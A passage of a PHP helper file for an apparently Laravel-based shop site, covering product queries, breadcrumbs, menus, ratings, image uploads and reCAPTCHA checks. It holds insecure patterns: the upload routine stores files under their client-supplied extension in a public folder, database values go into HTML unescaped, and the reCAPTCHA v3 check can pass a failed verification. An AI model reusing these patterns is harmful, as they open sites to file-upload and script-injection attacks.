            $goods_item_id = $GoodsItemId::whereIn('goods_subject_id', $goods_subject_id_arr)
                ->where('active', 1)
                ->where('deleted', 0)
                ->orderBy('position', 'asc')
                ->get();

            if ($goods_item_id->isEmpty())
                $goods_item_id = [];
        } else {
            $goods_item_id = $GoodsItemId::whereIn('goods_subject_id', $goods_subject_id_arr)
                ->where('active', 1)
                ->where('deleted', 0)
                ->where($new_popular, 1)
                ->orderBy('position', 'asc')
                ->get();

            if ($goods_item_id->isEmpty())
                $goods_item_id = [];
        }
    }

    if (!empty($goods_item_id)) {
        foreach ($goods_item_id as $one_item) {
            $goods_item[] = $GoodsItem::where('goods_item_id', $one_item->id)
                ->where('lang_id', $lang_id)
                ->first();
        }

        $goods_item = array_filter($goods_item);
    }

    return $goods_item;

}

/**
 * @param $lang_id
 * @param $lang
 * @return string
 */
function goodsBreadcrumbs($lang_id, $lang)
{
    $GoodsItemId = NModel . 'GoodsItemId';
    $GoodsItem = NModel . 'GoodsItem';
    $GoodsSubjectId = NModel . 'GoodsSubjectId';
    $GoodsSubject = NModel . 'GoodsSubject';


    $all_segments = request()->segments();
    $breadcrumbs = '';

    for ($i = 2; $i < count($all_segments); $i++) {

        $goods_subject_id_one = $GoodsSubjectId::where('alias', $all_segments[$i])
            ->where('active', 1)
            ->where('deleted', 0)
            ->first();

        $class_mobile_item = 'class="mobile-item"';

        if ($i < count($all_segments) - 2)
            $class_mobile_item = '';

        if (!is_null($goods_subject_id_one)) {
            $goods_subject_one = $GoodsSubject::where('goods_subject_id', $goods_subject_id_one->id)
                ->where('lang_id', $lang_id)
                ->first();

            if (!is_null($goods_subject_one)) {
                if ($i != (count($all_segments) - 1))
                    $breadcrumbs .= '<a href="' . url($lang . '/goods/' . SelectGoodsSubjectsAliasAsc($lang_id, $goods_subject_id_one->id)) . '" ' . $class_mobile_item . '>' . $goods_subject_one->name . '</a>';
                else
                    $breadcrumbs .= '<span>' . $goods_subject_one->name . '</span>';
            }
        } else {
            $goods_item_id = $GoodsItemId::where('alias', $all_segments[$i])
                ->where('active', 1)
                ->where('deleted', 0)
                ->first();

            if (!is_null($goods_item_id)) {
                $goods_item = $GoodsItem::where('goods_item_id', $goods_item_id->id)
                    ->where('lang_id', $lang_id)
                    ->first();

                if (!is_null($goods_item))
                    $breadcrumbs .= '<span>' . $goods_item->name . '</span>';
            }
        }

    }

    return $breadcrumbs;

}

/**
 * @param $var
 * @return bool
 */
function arrayMergeFilter($var)
{
    return ($var !== NULL && $var !== FALSE && $var !== '');
}

/**************************************
 ***************Back breadcrumbs******************
 **************************************/

/**
 * @param $lang
 * @param $lang_id
 * @param $id
 * @param $segment
 * @param $model
 * @param $row_id
 * @param $module_has_cart
 * @return string
 */
function universalBreadcrumbsByDb($lang, $lang_id, $id, $segment, $model, $row_id, $module_has_cart)
{

    $item = '';

//    if (request()->segment(5) == 'memberslist' || strpos(request()->segment(5), 'create') !== false || strpos(request()->segment(5), 'cart') !== false || strpos(request()->segment(5), 'video') !== false || strpos(request()->segment(5), 'photo') !== false || strpos(request()->segment(5), 'edit') !== false) {
    $ModelId = NModel . $model . 'Id';
    $Model = NModel . $model;

    if (is_subclass_of($ModelId, 'Illuminate\Database\Eloquent\Model') && is_subclass_of($ModelId, 'Illuminate\Database\Eloquent\Model')) {

        if($module_has_cart)
            $menu_id_by_level = $ModelId::where('deleted', 0)
                ->where('id', $id)
                ->first();
        else
            $menu_id_by_level = $ModelId::where('id', $id)
                ->first();

        if (!is_null($menu_id_by_level)) {
            $menu_by_level = $Model::where($row_id, $menu_id_by_level->id)
                ->where('lang_id', $lang_id)
                ->first();

            if (!is_null($menu_by_level)) {
                $item .= $menu_by_level->name . "," . $menu_id_by_level->alias . "," . $menu_id_by_level->id . "|" . universalBreadcrumbsByDb($lang, $lang_id, $menu_id_by_level->p_id, $segment, $model, $row_id, $module_has_cart);
            }
        }
    }
//    }

    return $item;
}

/**
 * @param $lang
 * @param $lang_id
 * @param $id
 * @param $modules_name
 * @param $modules_sumbenu_name
 * @param $segment
 * @param $model
 * @param $row_id
 * @param $module_has_cart
 * @return string
 */
function universalBreadcrumbsByDbFinal($lang, $lang_id, $id, $modules_name, $modules_sumbenu_name, $segment, $model, $row_id, $module_has_cart)
{

    $final_breadcrumbs = '';
    if (!is_null($model) && !is_null($row_id)) {

        if (!is_null($id)) {
            $breadcrumbs = universalBreadcrumbsByDb($lang, $lang_id, $id, $segment, $model, $row_id, $module_has_cart);

            $reverse_breadcrumbs = array_reverse(array_filter(explode('|', $breadcrumbs)));

            $final_breadcrumbs .= "<a href='/" . $lang . "/back' >" . trans('variables.home') . "</a>";

            if (!empty($reverse_breadcrumbs)) {
                $final_breadcrumbs .= "<a href='/" . $lang . "/back/" . $segment . "'>" . $modules_name->name . "</a>";
                foreach ($reverse_breadcrumbs as $key => $reverse_breadcrumb) {
                    $reverse_breadcrumb_arr = array_filter(explode(',', $reverse_breadcrumb));

                    if ($key == (count($reverse_breadcrumbs) - 1)) {

//                        if(!IfHasChildUnivLang($reverse_breadcrumb_arr[2], substr($row_id, 0, -3), $lang_id)->isEmpty())
//                            $final_breadcrumbs .= "<a href='/" . $lang . "/back/" . $segment . "/" . $reverse_breadcrumb_arr[1] . "/memberslist' class='active'>" . $reverse_breadcrumb_arr[0] . "</a>";
//                        else
                        $final_breadcrumbs .= "<span>" . $reverse_breadcrumb_arr[0] . "</span>";
                    } else
                        $final_breadcrumbs .= "<a href='/" . $lang . "/back/" . $segment . "/" . $reverse_breadcrumb_arr[1] . "/memberslist' >" . $reverse_breadcrumb_arr[0] . "</a>";
                }
            } else {
//                $final_breadcrumbs .= "<a href='/" . $lang . "/back/" . $segment . "' class='active'>" . $modules_name->name . "</a>";
                $final_breadcrumbs .= "<span>" . $modules_name->name . "</span>";
            }
        } else {

            $final_breadcrumbs .= "<a href='/" . $lang . "/back' >" . trans('variables.home') . "</a>";
            if (request()->segment(3) == 'goods' && !is_null(request()->segment(4)) && !empty($modules_sumbenu_name)) {
                $final_breadcrumbs .= "<a href='/" . $lang . "/back/'" . $segment . ">" . $modules_name->name . "</a>";
                $final_breadcrumbs .= "<a href='/" . $lang . "/back/" . $segment . "/" . $modules_sumbenu_name->modulesId->alias . "' class='active'>" . $modules_sumbenu_name->name . "</a>";
            } elseif (request()->segment(3) == 'goods' && is_null($modules_sumbenu_name))
                $final_breadcrumbs .= "<a href='/" . $lang . "/back/" . $segment . "'>" . $modules_name->name . "</a>";
            else {
//                $final_breadcrumbs .= "<a href='/" . $lang . "/back/" . $segment . "' class='active'>" . $modules_name->name . "</a>";
                $final_breadcrumbs .= "<span>" . $modules_name->name . "</span>";
            }
        }

    }

    return $final_breadcrumbs;
}

/**
 * @param $lang
 * @param $group
 * @param $modules_name
 * @param $segment
 * @param $user_id
 * @return string
 */
function adminUsersBreadcrumbsByDbFinal($lang, $group, $modules_name, $segment, $user_id)
{
    $final_breadcrumbs = '';

    $final_breadcrumbs .= "<a href='/" . $lang . "/back' >" . trans('variables.home') . "</a>";

    if(!is_null($user_id) && !is_null($group)) {
        $final_breadcrumbs .= "<a href='/" . $lang . "/back/" . $segment . "'>" . $modules_name->name . "</a>";
        $final_breadcrumbs .= "<a href='/" . $lang . "/back/" . $segment . "/" . $group->alias . "/memberslist'>" . $group->name . "</a>";
        $final_breadcrumbs .= "<span>" . $user_id->name . "</span>";
    }
    elseif (!is_null($group)) {
        $final_breadcrumbs .= "<a href='/" . $lang . "/back/" . $segment . "'>" . $modules_name->name . "</a>";
        $final_breadcrumbs .= "<span>" . $group->name . "</span>";
    }
    else {
        $final_breadcrumbs .= "<span>" . $modules_name->name . "</span>";
    }


    return $final_breadcrumbs;
}

/**************************************
 ***************Back breadcrumbs******************
 **************************************/

/**
 * @param $id
 * @param $table
 * @param null $deleted
 * @return mixed
 */
function IfHasChildActive($id, $table, $deleted = null)
{
    $table_id = $table . '_id';

    if (is_null($deleted)) {
        $deleted = 0;
    }
    $row = DB::table($table)
        ->join($table_id, $table_id . '.id', '=', $table . '.' . $table_id)
        ->where('p_id', $id)
        ->where('deleted', $deleted)
        ->get();

    return $row;
}

/**
 * @param $string
 * @param $count
 * @return string
 */
function strPosText($string, $count)
{
    if (strlen($string) > $count) {
        $fin_string_count = strpos($string, ' ', $count);
        $fin_string = substr($string, 0, $fin_string_count) . ' ...';
    } else
        $fin_string = $string;

    return $fin_string;
}

/**************************************
 ***************ADMIN FUNCTIONS******************
 **************************************/


/**************************************
 ***************FRONT FUNCTIONS******************
 **************************************/

/**
 * @param $lang_id
 * @param $date
 * @return string
 */
function getMonthNameByNr($lang_id, $date)
{
    $month_masive = explode(";", ShowSettingBodyByAlias('months_list', $lang_id));

    $month = $month_masive[date("m", strtotime($date)) - 1];

    $new_date = $month . ' ' . date("d", strtotime($date)) . ', ' . date("Y", strtotime($date));

//    return $month_masive[$month - 1];
    return $new_date;
}

/**
 * @param $lang_id
 * @param $date
 * @return object
 */
function getDMYByNr($lang_id, $date)
{
    $month_masive = explode(";", ShowSettingBodyByAlias('months_list', $lang_id));
    $month = $month_masive[date("m", strtotime($date)) - 1];

    $date_arr = [
        'day' => date("d", strtotime($date)),
        'month' => $month,
        'year' => date("Y", strtotime($date))
    ];

    return (object)$date_arr;
}

/**
 * @param $lang_id
 * @param $category_by_alias
 * @param $category_by_alias_children
 * @param $immobile_by_alias
 * @param $top_menu_by_alias
 * @param $blog_by_alias
 * @param $specialist
 * @return string
 */
function currentPageTitle($lang_id, $category_by_alias, $category_by_alias_children, $immobile_by_alias, $top_menu_by_alias, $blog_by_alias, $specialist)
{
    $title = ShowLabelById(2, $lang_id);
    if (request()->segment(2) == 'menu') {
        if (!empty($specialist))
            $title = $specialist->name;
        elseif (!empty($blog_by_alias))
            $title = $blog_by_alias->name;
        elseif (!empty($top_menu_by_alias))
            $title = $top_menu_by_alias->name;
    } elseif (request()->segment(2) == 'immobile-list' || request()->segment(2) == 'immobile-page') {
        if (!empty($immobile_by_alias))
            $title = $immobile_by_alias->name;
        elseif (!empty($category_by_alias_children))
            $title = $category_by_alias_children->name;
        elseif (!empty($category_by_alias))
            $title = $category_by_alias->name;
    }

    return $title;
}

/**
 * @param $lang_id
 * @param $p_id
 * @param null $active
 * @param null $deleted
 * @param null $footer_header
 * @return mixed
 */
function getMenuList($lang_id, $p_id, $active = null, $deleted = null, $footer_header = null)
{
    if (is_null($active)) {
        $active = 1;
    }
    if (is_null($deleted)) {
        $deleted = 0;
    }

    if (is_null($footer_header)) {
        $query = DB::table('menu')
            ->join('menu_id', 'menu_id.id', '=', 'menu.menu_id')
            ->where('p_id', $p_id)
            ->where('lang_id', $lang_id)
            ->where('active', $active)
            ->where('deleted', $deleted)
            ->orderBy('position', 'asc')
            ->get();
    } elseif ($footer_header == 'footer') {
        $query = DB::table('menu')
            ->join('menu_id', 'menu_id.id', '=', 'menu.menu_id')
            ->where('p_id', $p_id)
            ->where('lang_id', $lang_id)
            ->where('active', $active)
            ->where('deleted', $deleted)
            ->where('footer_menu', 1)
            ->orderBy('position', 'asc')
            ->get();
    } else {
        $query = DB::table('menu')
            ->join('menu_id', 'menu_id.id', '=', 'menu.menu_id')
            ->where('p_id', $p_id)
            ->where('lang_id', $lang_id)
            ->where('active', $active)
            ->where('deleted', $deleted)
            ->where('top_menu', 1)
            ->orderBy('position', 'asc')
            ->get();
    }


    return $query;
}

/**
 * @param $captcha
 * @param $type
 * @return bool
 */
function reCaptcha($captcha, $type)
{
    if ($type == 'hide')
        $secretKey = env('RE_CAP_SECRET_HIDE');
    else
        $secretKey = env('RE_CAP_SECRET');

    $ip = request()->ip();
    $response = file_get_contents("https://www.google.com/recaptcha/api/siteverify?secret=" . $secretKey . "&response=" . $captcha . "&remoteip=" . $ip);
    $responseKeys = json_decode($response, true);

    if (intval($responseKeys["success"]) !== 1)
        return false;
    else
        return true;

}

/**
 * @param $list
 * @param $p
 * @return array
 */
function partitionChunk($list, $p)
{
    $listlen = count($list);
    $partlen = floor($listlen / $p);
    $partrem = $listlen % $p;
    $partition = array();
    $mark = 0;
    for ($px = 0; $px < $p; $px++) {
        $incr = ($px < $partrem) ? $partlen + 1 : $partlen;
        $partition[$px] = array_slice($list, $mark, $incr);
        $mark += $incr;
    }
    return $partition;
}

/**
 * @param $item_id
 * @return float|int
 */
function CountRating($item_id)
{

    $GoodsItemComments = NModel . 'GoodsItemComments';
    $sum = $GoodsItemComments::where('goods_item_id', $item_id)
        ->where('active', 1)
        ->sum('rating');

    $count = $GoodsItemComments::where('goods_item_id', $item_id)
        ->where('active', 1)
        ->count('id');

    if ($count <= 0) $rating = 0;
    elseif ($count == 1) $rating = $sum;
    elseif ($count == 2) $rating = $sum / $count;
    else {
        $middle = $sum / $count;
        $n = 3;
        $rating = $count / ($count + $n) * $middle + $n / ($count + $n) * 4.166666666;
    }
    $string = '';

    for ($i = 5; $i > 0; $i--) {
        if ($i < $rating) {
            if ($i == intval(round($rating))) {
                $string .= '<input type="radio" class="static_rating-input this_is_rating"
                                   id="static_rating-input-1-' . $i . '" name="static_rating-input-1">
                            <label for="static_rating-input-1-' . $i . '" class="static_rating-star"></label>';
            } else {
                $string .= '<input type="radio" class="static_rating-input"
                                   id="static_rating-input-1-' . $i . '" name="static_rating-input-1">
                            <label for="static_rating-input-1-' . $i . '" class="static_rating-star"></label>';
            }
        } else {
            if ($i == intval(round($rating))) {
                $string .= '<input type="radio" class="static_rating-input this_is_rating"
                                   id="static_rating-input-1-' . $i . '" name="static_rating-input-1">
                            <label for="static_rating-input-1-' . $i . '" class="static_rating-star"></label>';
            } else {
                $string .= '<input type="radio" class="static_rating-input"
                                   id="static_rating-input-1-' . $i . '" name="static_rating-input-1">
                            <label for="static_rating-input-1-' . $i . '" class="static_rating-star"></label>';
            }
        }
    }

    return $string;
}

/**
 * @param $item_id
 * @return mixed
 */
function totalRating($item_id)
{
    $GoodsItemComments = NModel . 'GoodsItemComments';

    $count = $GoodsItemComments::where('goods_item_id', $item_id)
        ->where('active', 1)
        ->count('id');

    return $count;
}

/**
 * @param $lang_id
 * @return array
 */
function goodsCurrPage($lang_id)
{
    $GoodsItemId = NModel . 'GoodsItemId';
    $GoodsItem = NModel . 'GoodsItem';
    $GoodsSubjectId = NModel . 'GoodsSubjectId';
    $GoodsSubject = NModel . 'GoodsSubject';


    $all_segments = request()->segments();
    $curr_subject_name_descr = [];

    for ($i = 2; $i < count($all_segments); $i++) {

        if ($i == (count($all_segments) - 1)) {
            $goods_subject_id = $GoodsSubjectId::where('alias', $all_segments[$i])
                ->where('active', 1)
                ->where('deleted', 0)
                ->first();

            if (!is_null($goods_subject_id)) {
                $goods_subject = $GoodsSubject::where('goods_subject_id', $goods_subject_id->id)
                    ->where('lang_id', $lang_id)
                    ->first();

                if (!is_null($goods_subject)) {
                    $curr_subject_name_descr = [
                        'name' => $goods_subject->name,
                        'description' => $goods_subject->body,
                        'img' => ''
                    ];
                }
            } else {
                $goods_item_id = $GoodsItemId::where('alias', $all_segments[$i])
                    ->where('active', 1)
                    ->where('deleted', 0)
                    ->first();

                if (!is_null($goods_item_id)) {
                    $goods_item = $GoodsItem::where('goods_item_id', $goods_item_id->id)
                        ->where('lang_id', $lang_id)
                        ->first();

                    if (!is_null($goods_item))
                        $curr_subject_name_descr = [
                            'name' => $goods_item->name,
                            'description' => $goods_item->body,
                            'img' => !is_null($goods_item->goodsOnePhoto) ? $goods_item->goodsOnePhoto->img : ''
                        ];
                }
            }
        }

    }

    return $curr_subject_name_descr;
}

/**
 * @param $lang_id
 * @return array
 */
function galleryCurrPage($lang_id)
{
    $GalleryItemId = NModel . 'GalleryItemId';
    $GalleryItem = NModel . 'GalleryItem';
    $GallerySubjectId = NModel . 'GallerySubjectId';
    $GallerySubject = NModel . 'GallerySubject';


    $all_segments = request()->segments();
    $curr_subject_name_descr = [];

    for ($i = 2; $i < count($all_segments); $i++) {

        if ($i == (count($all_segments) - 1)) {
            $gallery_subject_id = $GallerySubjectId::where('alias', $all_segments[$i])
                ->where('active', 1)
                ->where('deleted', 0)
                ->first();

            if (!is_null($gallery_subject_id)) {
                $gallery_subject = $GallerySubject::where('gallery_subject_id', $gallery_subject_id->id)
                    ->where('lang_id', $lang_id)
                    ->first();

                if (!is_null($gallery_subject)) {
                    $curr_subject_name_descr = [
                        'name' => $gallery_subject->name,
                        'description' => $gallery_subject->body,
                        'img' => ''
                    ];
                }
            } else {
                $gallery_item_id = $GalleryItemId::where('alias', $all_segments[$i])
                    ->where('active', 1)
                    ->where('deleted', 0)
                    ->first();

                if (!is_null($gallery_item_id)) {
                    $gallery_item = $GalleryItem::where('gallery_item_id', $gallery_item_id->id)
                        ->where('lang_id', $lang_id)
                        ->first();

                    if (!is_null($gallery_item))
                        $curr_subject_name_descr = [
                            'name' => $gallery_item->name,
                            'description' => $gallery_item->body,
                            'img' => $gallery_item->goodsOnePhoto->img
                        ];
                }
            }
        }

    }

    return $curr_subject_name_descr;
}


/**
 * @param $lang_id
 * @return array
 */
function menuCurrPage($lang_id)
{
    $MenuId = NModel . 'MenuId';
    $Menu = NModel . 'Menu';

    $all_segments = request()->segments();
    $curr_menu_name_descr = [];

    for ($i = 1; $i < count($all_segments); $i++) {

        if ($i == (count($all_segments) - 1)) {

            $menu_id = $MenuId::where('alias', $all_segments[$i])
                ->where('active', 1)
                ->where('deleted', 0)
                ->first();

            if (!is_null($menu_id)) {
                $menu = $Menu::where('menu_id', $menu_id->id)
                    ->where('lang_id', $lang_id)
                    ->first();

                if (!is_null($menu)) {
                    $curr_menu_name_descr = [
                        'name' => $menu->name,
                        'meta_title' => $menu->meta_title,
                        'description' => $menu->meta_description
                    ];
                }
            }
        }

    }

    return $curr_menu_name_descr;
}

/**
 * @param $lang_id
 * @param $lang
 * @param $subjects
 * @param $display_lvl
 * @param string $html_el
 * @param string $ul_class
 * @param string $li_class
 * @param null $p_id
 * @param int $level
 * @return string
 */
function fullGoodsMenu($lang_id, $lang, $subjects, $display_lvl, $html_el = 'ul', $ul_class = '', $li_class = '', $p_id = null, $level = 0)
{

    $GoodsSubjectId = NModel . 'GoodsSubjectId';
    $GoodsSubject = NModel . 'GoodsSubject';

    if ($html_el == 'ul') {
        $html_el_ch = 'li';
    } else {
        $html_el_ch = 'div';
    }

    $ret = '';

    if ($display_lvl >= $level) {

        if (!is_null($p_id)) {
            $subjects_id = $GoodsSubjectId::where('active', 1)
                ->where('deleted', 0)
                ->where('p_id', $p_id)
                ->orderBy('position', 'asc')
                ->get();

            $subjects = [];

            if (!$subjects_id->isEmpty()) {
                foreach ($subjects_id as $one_subject_id) {
                    $subjects[] = $GoodsSubject::where('goods_subject_id', $one_subject_id->id)
                        ->where('lang_id', $lang_id)
                        ->first();

                }
            }
        }

        if (!empty($subjects)) {

            if ($level == 0) {
                $ret .= '<' . $html_el . '' . (!empty($ul_class) ? " class=\"$ul_class\"" : "") . '>';
            } elseif ($level == 1) {
                $ret .= '<' . $html_el . ' class="sub-menu">';
            } else {
                $ret .= '<' . $html_el . '' . ($level > 1 ? " class=\"sub-menu-level-$level\"" : "") . '>';
            }

            foreach ($subjects as $key => $goods_subject) {

                if (!empty(IfGoodsHasChild($goods_subject->goods_subject_id, 'goods_subject'))) {
                    $has_submenu = 'has-submenu';
                } else {
                    $has_submenu = '';
                }

                if ($level == 0) {
                    $ret .= '<' . $html_el_ch . '' . (!empty($li_class) ? " class=\"$li_class-{$goods_subject->goodsSubjectId->alias} $has_submenu\"" : " class=\"$has_submenu\"") . '><a href="' . url($lang . "/goods/" . SelectGoodsSubjectsAliasAsc($lang_id, $goods_subject->goods_subject_id)) . '"><p>' . $goods_subject->name . '</p></a>';
//          Unique for all projects
                    if (!empty($goods_subject->goodsSubjectId->img))
                        $ret .= '<div class="catalog-menu-item-img-wrap"><img src="' . asset("/upfiles/goods/m/{$goods_subject->goodsSubjectId->img}") . ' " alt="' . $goods_subject->name . '" title="' . $goods_subject->name . '" class="catalog-menu-item-img"></div>';
                    else
                        $ret .= '<div class="catalog-menu-item-img-wrap"><img src="' . asset("front-assets/img/no-image.png") . ' " alt="No image" class="catalog-menu-item-img"></div>';
//          Unique for all projects
                    $ret .= fullGoodsMenu($lang_id, $lang, $subjects, $display_lvl, $html_el, $ul_class, $li_class, $goods_subject->goods_subject_id, $level + 1);
                    $ret .= '</' . $html_el_ch . '>';
                } elseif ($level == 1) {
//          Unique for all projects
                    if ($key == 0) {
                        $ret .= '<' . $html_el_ch . ' class="sub-menu-category-item"><a href="' . url($lang . "/goods/" . SelectGoodsSubjectsAliasAsc($lang_id, $goods_subject->goodsSubjectId->p_id)) . '"><p>' . SelectFirstParentItemsName($lang_id, $goods_subject->goodsSubjectId->p_id) . '</p></a>';
                        $ret .= '</' . $html_el_ch . '>';
                    }
//          Unique for all projects
                    $ret .= '<' . $html_el_ch . ' class="' . $has_submenu . '"><a href="' . url($lang . "/goods/" . SelectGoodsSubjectsAliasAsc($lang_id, $goods_subject->goods_subject_id)) . '"><p>' . $goods_subject->name . '</p></a>';
                    $ret .= fullGoodsMenu($lang_id, $lang, $subjects, $display_lvl, $html_el, $ul_class, $li_class, $goods_subject->goods_subject_id, $level + 1);
                    $ret .= '</' . $html_el_ch . '>';
                } else {
                    $ret .= '<' . $html_el_ch . '' . ($level > 1 ? " class=\"sub-menu-level-$level-item $has_submenu\"" : "") . '><a href="' . url($lang . "/goods/" . SelectGoodsSubjectsAliasAsc($lang_id, $goods_subject->goods_subject_id)) . '"><p>' . $goods_subject->name . '</p></a>';
                    $ret .= fullGoodsMenu($lang_id, $lang, $subjects, $display_lvl, $html_el, $ul_class, $li_class, $goods_subject->goods_subject_id, $level + 1);
                    $ret .= '</' . $html_el_ch . '>';
                }

            }

            $ret .= '</' . $html_el . '>';
        }
    }

    return $ret;

}

/**
 * @param $alias_arr
 * @param null $id
 * @return array
 */
function getUrlGoodsSubjectByAlias($alias_arr, $id = null)
{

    $GoodsSubjectId = NModel . 'GoodsSubjectId';
    $GoodsItemId = NModel . 'GoodsItemId';
    $subjects_list = [];


    if (!empty($alias_arr)) {
        $subjects_list = ['goods'];
        foreach ($alias_arr as $key => $item) {

            if (is_null($id))
                $exist_subject = $GoodsSubjectId::where('alias', $item)
                    ->where('active', 1)
                    ->where('deleted', 0)
                    ->first();
            else
                $exist_subject = $GoodsSubjectId::where('alias', $item)
                    ->where('active', 1)
                    ->where('deleted', 0)
                    ->where('p_id', $id)
                    ->first();

            if (!is_null($exist_subject)) {
                unset($alias_arr[$key]);
                getUrlGoodsSubjectByAlias($alias_arr, $exist_subject->id);
                $subjects_list[] = $exist_subject->alias;

            } else {

                $exist_item = $GoodsItemId::where('alias', $item)
                    ->where('active', 1)
                    ->where('deleted', 0)
                    ->first();

                if (!is_null($exist_item)) {
                    $goods_subject_id = $GoodsSubjectId::where('id', $exist_item->goods_subject_id)
                        ->where('active', 1)
                        ->where('deleted', 0)
                        ->first();

                    if (!is_null($goods_subject_id))
                        $subjects_list[] = $exist_item->alias;

                }

                if (count($subjects_list) === 1)
                    unset($subjects_list[0]);

                return $subjects_list;
            }


        }

    }
    return $subjects_list;
}

/**
 * @param $element_id
 * @param $model
 * @param $row_id
 * @param null $active
 * @param null $limit
 * @return array|string
 */
function displayOneImgFront($element_id, $model, $row_id, $active = null, $limit = null)
{

    $tableImages = NModel . $model;

    if (is_null($limit))
        $limit = 1;

    if (is_null($active))
        $active = 1;

    if ($limit > 1) {
        $query = $tableImages::where($row_id, $element_id)
            ->where('active', $active)
            ->orderBy('position', 'asc')
            ->take($limit)
            ->pluck('img')
            ->toArray();

        if (empty($query))
            $query = [];
    } else {
        $query = $tableImages::where($row_id, $element_id)
            ->where('active', $active)
            ->orderBy('position', 'asc')
            ->pluck('img')
            ->first();

        if (is_null($query))
            $query = '';
    }


    return $query;

}

/**************************************
 ***************FRONT FUNCTIONS******************
 **************************************/

/**Upload images**/
function uploadAdminImages($files,$upload,$module,$element,$hidden_img='')
{
	$uploadPath = $module;
	if($hidden_img) return $hidden_img;
	if($files){
		foreach($files as $key=>$file){
			if($upload && in_array($key,$upload)){ //проверка на загружаемые фотографии
				$extension = $file->getClientOriginalExtension(); // getting image extension
				$fileName = md5(time()) . rand(11111111,99999999).'.'.$extension; // renameing image
				switch(strtolower($file->getClientOriginalExtension())){
					case 'jpg':
					case 'png':
					case 'jpeg':{
						$fileType = 'img';
						$destinationPath = 'upfiles/'.$uploadPath;
						break;
					}
					default : {
						$destinationPath = 'upfiles';
						$fileType = 'other';
						break;
					}
				}

				$file->move($destinationPath, $fileName); //Загружаем фото

				// create folder if this don't exist
				if(!File::exists($destinationPath)){
					File::makeDirectory($destinationPath);
				}
				if(!File::exists($destinationPath.'/m')){
					File::makeDirectory($destinationPath.'/m');
				}
				if(!File::exists($destinationPath.'/s')){
					File::makeDirectory($destinationPath.'/s');
				}

				if($module){
					if($module == 'menu'){
						resizeIMGbyMaxSize($uploadPath, $destinationPath.'/m/', $fileName, 600);
                        CreateImageManipulator($uploadPath, $destinationPath . '/s/', $fileName, 280, 280, true);


//						if($element->img){
//							if (File::exists($destinationPath.$element->img)) {
//								File::delete($destinationPath.$element->img);
//							}
//							if (File::exists($destinationPath.'/m/'.$element->img)) {
//								File::delete($destinationPath.'/m/'.$element->img);
//							}
//							if (File::exists($destinationPath.'/s/'.$element->img)) {
//								File::delete($destinationPath.'/s/'.$element->img);
//							}
//						}

						$new_image = new MenuImages();
						$new_image->menu_id = $element->id;
						$new_image->img = $fileName;
						$new_image->active = 1;
						$new_image->position = GetMaxPosition('menu_images') + 1;
						$new_image->save();
					}
                    if($module == 'goods'){
                        CreateImageManipulator($uploadPath, $destinationPath . '/s/', $fileName, 318, 180);
                        CreateImageManipulator($uploadPath, $destinationPath . '/m/', $fileName, 219, 226);
                        return $fileName;
                    }
				}
			}
		}
	}

}

/**
 * @param $table
 * @param $alias
 * @param $lang_id
 * @param $type
 * @param $order
 * @param $order_type
 * @param $active
 * @param $deleted
 * @return array | $row
 */
function getTableByAlias($table, $alias, $lang_id, $type='get', $order='position', $order_type='asc', $active=1, $deleted=0)
{
    $table_id = $table.'_id';

    if($type == 'get')
        $row = DB::table($table_id)
            ->where('active', $active)
            ->where('deleted', $deleted)
            ->where('alias', $alias)
            ->join($table, $table.'.'.$table_id, '=', $table_id.'.id')
            ->where('lang_id', $lang_id)
            ->select('*',$table_id.'.id as id')
            ->orderBy($order, $order_type)
            ->get();
    else
        $row = DB::table($table_id)
            ->where('active', $active)
            ->where('deleted', $deleted)
            ->where('alias', $alias)
            ->join($table, $table.'.'.$table_id, '=', $table_id.'.id')
            ->where('lang_id', $lang_id)
            ->select('*',$table_id.'.id as id')
            ->orderBy($order, $order_type)
            ->first();

    return $row;
}

function reCaptchaVersionThree($captcha)
{
    $secretKey = env('RE_CAP_SECRET');
    $answer = env('RE_CAP_MIN');

    $ip = request()->ip();

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL,"https://www.google.com/recaptcha/api/siteverify");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query(array('secret' => $secretKey, 'response' => $captcha, 'ip' => $ip)));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);
    //$response=file_get_contents("https://www.google.com/recaptcha/api/siteverify?secret=".$secretKey."&response=".$captcha."&remoteip=".$ip);

    $responseKeys = json_decode($response, true);

    if(array_key_exists('error-codes', $responseKeys))
        return false;

    if(intval($responseKeys['success']) !== 1 && floatval($responseKeys['score']) < $answer)
        return false;
    else
        return true;
}

function getBrandName($id, $lang)
{
    $row = DB::table('goods_brand')
        ->where('id', $id)
        ->first();

    if($row){

        $name = $row->name_ro;

        if ($lang == 'ru')
            $name = $row->name_ru;

        if ($lang == 'ro')
            $name = $row->name_ro;

        return $name;
    }
}

//Default price format or price if user has discount
function getDefaultPriceFormat($price)
{
    if(Session::get('session-front-user')['user_id'] && Session::get('session-front-user')['user_discount'])
        $new_price = number_format($price * (100 - Session::get('session-front-user')['user_discount']) / 100, 0, '.', '');
    else
        $new_price = number_format($price, 0, '.', '');

    return $new_price;
}

function ifUserLogIn()
{
    $user_login = null;

    if(!empty(Session::get('session-front-user')) && is_int(Session::get('session-front-user'))) {
        $user_login = FrontUser::where('id', Session::get('session-front-user'))
            ->where('active', 1)
            //->where('deleted', 0)
            ->first();
    }

    return is_null($user_login) ? false : true;
}

function getAuthorizedUser()
{
    $user = null;

    if(!empty(Session::get('session-front-user')['user_id']) && is_int(Session::get('session-front-user')['user_id'])) {

        $user = FrontUser::where('id', Session::get('session-front-user')['user_id'])
            ->where('active', 1)
            ->first();
    }

    return is_null($user) ? null : $user;
}

function substrBySpace($str, $length, $strip_tags=1, $trim=1){
    if($strip_tags == 1) $str = strip_tags($str);
    if (mb_strlen($str) > $length){
        $str = mb_substr($str, 0, $length);
        $str_space = mb_substr($str, 0 ,mb_strrpos($str, " "));
        if($trim == 1) return preg_replace("/\s+/", " ", $str_space ? $str_space : $str);
        else return $str_space?$str_space:$str;
    }else {
        return $str;
    }
}


function CountCompareBySubject($subject_id){
    $compare_id = Cookie::get('compare');

    $row = DB::table('compare')
        ->where('compare_id', $compare_id)
        ->where('goods_subject_id', $subject_id)
        ->count();

    return $row;
}


function ParametrDisplayOneValue($parametr, $item_id, $lang_id)
{

    switch ($parametr->parametr_type) {
        case 'select':
        case 'radio':
            $param_value = GetItemRSCSelectData($parametr->id, $item_id);

            if (!is_null($param_value) && $param_value->goods_parametr_value_id > 0) {
                return IfHasName($param_value->goods_parametr_value_id, $lang_id, 'goods_parametr_value');
            }
            break;

        case 'checkbox':
